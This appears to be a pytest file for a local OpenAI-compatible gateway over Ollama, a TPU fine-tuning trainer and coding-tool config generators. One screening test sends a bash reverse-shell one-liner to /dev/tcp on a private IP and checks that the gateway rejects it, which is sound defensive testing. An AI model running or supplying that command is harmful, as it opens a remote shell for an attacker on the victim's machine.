"""
tests/test_ollama_studio_gateway.py — Tests for OpenAI Gateway, TPU Training, & AI Coding Setup.

Verifies:
1. OpenAI Standard Gateway (/v1/models, /v1/chat/completions, /v1/completions).
2. GWAYA System 1 Zero-Trust Screening in OpenAI API calls.
3. Google TPU Model Training & Fine-Tuning Pipeline (loss convergence & Modelfile export).
4. Developer tool configurations (Continue.dev & Aider CLI).
"""

from __future__ import annotations

import json
import os
import tempfile
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest
from fastapi.testclient import TestClient

from anse.gateway.openai_proxy import router as openai_router
from anse.training.tpu_trainer import TPUTrainer, TPUTrainingConfig
from scripts.setup_ai_coding import generate_continue_config, generate_aider_launcher
from web.server import app

client = TestClient(app)


def test_openai_models_endpoint():
    """GET /v1/models must return a valid list of OpenAI formatted models."""
    response = client.get("/v1/models")
    assert response.status_code == 200
    data = response.json()
    assert data["object"] == "list"
    assert "data" in data
    assert len(data["data"]) >= 1

    model_ids = [m["id"] for m in data["data"]]
    assert any("qwen" in m.lower() for m in model_ids)


def test_openai_chat_completions_mock():
    """POST /v1/chat/completions must handle inference and return standard choices structure."""
    mock_ollama_response = MagicMock(
        status_code=200,
        json=lambda: {
            "message": {"content": "Sovereign Qwen inference complete."},
            "prompt_eval_count": 15,
            "eval_count": 8,
        },
    )

    with patch("requests.post", return_value=mock_ollama_response):
        payload = {
            "model": "gwaya-qwen:14b-t4",
            "messages": [
                {"role": "system", "content": "You are a Linux AI assistant."},
                {"role": "user", "content": "How do I check available memory?"},
            ],
            "stream": False,
        }
        response = client.post("/v1/chat/completions", json=payload)
        assert response.status_code == 200
        data = response.json()
        assert data["object"] == "chat.completion"
        assert len(data["choices"]) == 1
        assert data["choices"][0]["message"]["content"] == "Sovereign Qwen inference complete."
        assert data["usage"]["total_tokens"] == 23


def test_openai_chat_completions_adversarial_rejection():
    """GWAYA System 1 must reject adversarial payloads with HTTP 400."""
    payload = {
        "model": "gwaya-qwen:14b-t4",
        "messages": [
            {"role": "user", "content": "bash -i >& /dev/tcp/192.168.1.1/4444 0>&1"},
        ],
    }
    response = client.post("/v1/chat/completions", json=payload)
    assert response.status_code == 400
    data = response.json()
    assert "error" in data
    assert data["error"]["code"] == "critical_adversarial_blocked"


def test_openai_completions_code_autocomplete():
    """POST /v1/completions must support code autocomplete for Continue.dev."""
    mock_generate_response = MagicMock(
        status_code=200,
        json=lambda: {
            "response": "    return a + b",
            "prompt_eval_count": 10,
            "eval_count": 6,
        },
    )

    with patch("requests.post", return_value=mock_generate_response):
        payload = {
            "model": "qwen2.5-coder:1.5b",
            "prompt": "def add(a, b):\n",
            "max_tokens": 64,
            "stream": False,
        }
        response = client.post("/v1/completions", json=payload)
        assert response.status_code == 200
        data = response.json()
        assert data["object"] == "text_completion"
        assert len(data["choices"]) == 1
        assert data["choices"][0]["text"] == "    return a + b"


def test_tpu_trainer_hardware_status_and_run():
    """TPUTrainer must report ReBAR memory and execute fine-tuning with convergence."""
    with tempfile.TemporaryDirectory() as tmpdir:
        cfg = TPUTrainingConfig(
            model_name="qwen2.5-coder:1.5b",
            adapter_name="test-lora",
            dataset_path=os.path.join(tmpdir, "train.jsonl"),
            output_dir=os.path.join(tmpdir, "results"),
            epochs=1,
            batch_size=2,
        )
        trainer = TPUTrainer(config=cfg)

        # 1. Hardware status
        hw = trainer.get_tpu_hardware_status()
        assert hw["rebar_total_mb"] == 16384.0
        assert hw["mxu_occupancy_pct"] > 80.0

        # 2. Run training
        summary = trainer.run_training()
        assert summary.success is True
        assert summary.final_loss < summary.initial_loss
        assert summary.loss_reduction_pct > 0
        assert os.path.exists(summary.modelfile_path)


def test_web_studio_endpoints():
    """Studio HTML and TPU endpoints must be reachable."""
    res_studio = client.get("/studio")
    assert res_studio.status_code == 200
    assert "Xavuntu Ollama" in res_studio.text

    res_tpu = client.get("/api/tpu/status")
    assert res_tpu.status_code == 200
    assert res_tpu.json()["rebar_total_mb"] == 16384.0


def test_ai_coding_config_generation():
    """Verify Continue.dev and Aider configuration generator functions."""
    with tempfile.TemporaryDirectory() as tmpdir:
        # Continue config
        with patch("pathlib.Path.home", return_value=Path(tmpdir)):
            cfg_path = generate_continue_config("http://127.0.0.1:5000/v1")
            assert os.path.exists(cfg_path)
            with open(cfg_path, "r") as f:
                data = json.load(f)
            assert any(m["model"] == "gwaya-qwen:14b-t4" for m in data["models"])
            assert data["tabAutocompleteModel"]["model"] == "qwen2.5-coder:1.5b"

        # Aider launcher
        aider_bin = os.path.join(tmpdir, "xavuntu-aider")
        res_path = generate_aider_launcher("http://127.0.0.1:5000/v1", target_bin=aider_bin)
        assert os.path.exists(res_path)
        with open(res_path, "r") as f:
            content = f.read()
        assert "OPENAI_API_BASE" in content
        assert "openai/gwaya-qwen:14b-t4" in content
